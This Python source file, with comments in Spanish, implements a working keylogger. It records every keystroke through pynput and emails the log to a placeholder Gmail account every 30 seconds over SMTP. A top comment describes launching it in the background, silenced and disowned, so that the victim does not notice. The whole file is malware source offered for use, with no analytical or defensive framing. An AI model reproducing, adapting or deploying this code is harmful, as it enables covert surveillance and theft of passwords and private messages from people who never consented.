#!/usr/bin/env python3 
# TODO Debemos abrir el main.py //    python3 main.py &> /dev/null & disown 
# TODO De esta manera correremos el script en segundo plano sin que la víctima se entere. 

# Importación de módulos necesarios
import pynput.keyboard  # Para capturar las pulsaciones del teclado
import threading  # Para ejecutar el envío de emails periódicamente en un hilo separado
import smtplib  # Para el envío de emails
from email.mime.text import MIMEText  # Para crear el cuerpo del mensaje de email
from termcolor import colored  # Para imprimir mensajes en la terminal con colores

# Definición de la clase Keylogger
class Keylogger:
    # Constructor de la clase
    def __init__(self):
        self.log = " "  # Cadena donde se almacenarán las pulsaciones de teclas
        self.request_shutdown = False  # Bandera para solicitar el cierre del keylogger
        self.timer = None  # Referencia al temporizador para el envío periódico de emails
        self.is_first_run = True  # Bandera para identificar el primer envío de email

    # Método para manejar las pulsaciones de teclas
    def pressed_key(self, key):
        try:
            # Intenta obtener el carácter de la tecla presionada
            self.log += str(key.char)
        except AttributeError:
            # En caso de teclas especiales, como espacios o retrocesos, se añaden cadenas específicas
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ",
                            key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt ", key.cmd: " Window "}
            self.log += special_keys.get(key, f" {str(key)} ")

    # Método para enviar emails
    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        # Establece conexión con el servidor SMTP y envía el email
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        print(colored(f"\n[+] Email sent Successfully!!", "green"))

    # Método para reportar las pulsaciones de teclas capturadas
    def report(self):
        email_body = "[+] El Keylogger se ha iniciado con éxito" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "elquenviaelmensaje@gmail.com", ["Elquerecibeelmensaje@gmail.com"], "Contraseña de la API")
        self.log = ""
        
        # Reinicia el temporizador para el próximo envío si no se ha solicitado el cierre
        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    # Método para detener el keylogger
    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    # Método para iniciar el keylogger
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()